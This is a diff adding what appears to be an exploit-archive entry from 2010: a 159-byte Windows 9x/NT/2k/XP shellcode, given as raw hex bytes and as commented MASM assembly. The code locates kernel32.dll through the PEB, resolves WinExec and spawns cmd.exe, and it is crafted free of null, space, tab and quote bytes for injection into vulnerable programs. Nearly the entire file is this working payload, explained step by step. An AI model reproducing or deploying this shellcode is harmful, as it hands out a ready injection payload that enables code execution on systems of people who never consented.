@@ -1,0 +1,142 @@
+id: 14271
+date: 10/01/2010
+title: win32 9x/NT/2k/XP Generic cmd.exe Shellcode 159 bytes
+author: Pepelux
+cves: 
+
+=====================================================
+win32 9x/NT/2k/XP Generic cmd.exe Shellcode 159 bytes
+=====================================================
+
+; Windows 9x/NT/2k/XP Generic cmd.exe Shellcode
+; 159 bytes
+;
+; free of null bytes (\x00), spaces (\x20), tabs (\x09), quotes (\x22)
+;
+; by Pepelux - pepeluxx[at]gmail[dot]com
+; http://www.pepelux.org - http://www.enye-sec.org
+;
+; 33 C0 64 8B 40 30 8B 40 0C 85 C0 78 09 8B 70 1C 
+; AD 8B 40 08 EB 09 8B 40 34 8D 40 7C 8B 40 3C 50
+; 8B 34 24 03 76 3C 8B 56 78 03 14 24 8B CA 83 C1
+; 1F 41 8B 19 03 1C 24 33 C0 8B 3B 03 3C 24 81 3F
+; 57 69 6E 45 75 0F 66 81 7F 04 78 65 75 07 66 83
+; 7F 06 63 74 0A 90 83 C3 04 40 3B 42 18 75 DA 8B
+; 72 24 03 34 24 33 C9 66 8B 0C 46 8B 7A 1C 03 3C
+; 24 8B 04 8F 03 04 24 8B EC 32 D2 83 EC 0C C7 45
+; F7 63 6D 64 2E 66 C7 45 FB 65 78 C6 45 FD 65 88
+; 55 FE 8D 4D F7 33 DB B3 05 53 51 8B D8 FF D3
+
+
+.386
+.model flat, stdcall  ;32 bit memory model
+option casemap :none  ;case sensitive
+assume fs:nothing
+
+include windows.inc
+include kernel32.inc
+
+includelib masm32.lib
+includelib kernel32.lib
+
+
+.code
+start:
+; ************************************
+; Search for kernel32.dll base address
+; ************************************
+busca_kernel32:
+   xor eax, eax
+   mov eax, fs:[eax+30h]	; link to PEB
+   mov eax, [eax+0ch]		; link to data struct
+   test eax, eax
+   js busca_kernel32_9x		; if FS=1 then Windows 9x else NT, XP, ...
+
+busca_kernel32_nt:
+   mov esi, [eax+1ch]		; first entry
+   lodsd			; next entry
+   mov eax, [eax+08h]		; eax=base address
+   jmp fin_kernel32
+
+busca_kernel32_9x:
+   mov eax, [eax+34h]
+   lea eax, [eax+7ch]
+   mov eax, [eax+3ch]		; eax=base address
+
+fin_kernel32:
+   push eax
+
+; **************************************************
+; Search for WinExec using kernel32.dll base address
+; **************************************************
+busca_funcion:
+	mov esi, [esp]			; link to kernel32.dll base address
+	add esi, [esi+03Ch]		; link to PE signature
+	mov edx, [esi+078h]		; link to Export table
+	add edx, [esp]			; adding base address
+
+	mov ecx, edx			; avoid 20h opcode (space)
+	add ecx, 1fh
+	inc ecx
+	mov ebx, [ecx]			; link to array AddressOfNames
+	add ebx, [esp]
+	xor eax, eax			; index of AddressOfNames	
+
+bucle_funcion:				; search WinExec function
+	mov edi, [ebx]
+	add edi, [esp]
+
+	cmp dword ptr [edi], 456E6957h  ; EniW = WinE in the other way
+	jnz funcion_no_encontrada
+	cmp word ptr [edi + 4], 6578h	; ex = xe in the other way
+	jnz funcion_no_encontrada
+	cmp word ptr [edi + 6], 63h	; c
+	je funcion_encontrada
+   
+funcion_no_encontrada:
+	nop				; NOP to avoid 09h opcode (tab)
+	add ebx, 4
+	inc eax
+	cmp eax, dword ptr [edx+18h]
+	jnz bucle_funcion
+
+funcion_encontrada:
+	mov esi, dword ptr [edx + 24h] 		; link to ordinals table
+	add esi, [esp]		 		; adding base address
+	xor ecx, ecx
+	mov cx, word ptr [esi + 2 * eax] 	; cx = function number
+	mov edi, dword ptr [edx + 1ch] 		; link to address table
+	add edi, [esp]		 		; adding base address
+	mov eax, dword ptr [edi + 4 * ecx] 	; link to found function
+	add eax, [esp]				; adding base address
+
+
+; ***************
+; Running cmd.exe
+; ***************
+	mov ebp, esp
+	xor dl, dl
+
+	sub esp, 0ch ; substract 0ch bytes to esp to save 'cmd.exe' string
+
+	mov dword ptr [ebp-09h], 2e646d63h	; .dmc = cmd. in the other way
+	mov word ptr [ebp-05h],  7865h		; xe = ex in the other way
+	mov byte ptr [ebp-03h],  65h		; e
+	mov byte ptr [ebp-02h],  dl	 	; 0x00 (end of string)
+
+	lea ecx, [ebp-09h] 	; eax=link to cmd.exe string
+
+	xor ebx, ebx
+	mov bl, 5		; SW_SHOW
+	push ebx
+	push ecx
+
+	mov ebx, eax
+	call ebx 		; call to WinExec
+
+	invoke ExitProcess, 0
+end start
+
+
+
+#  0day.today [2023-03-26]  #
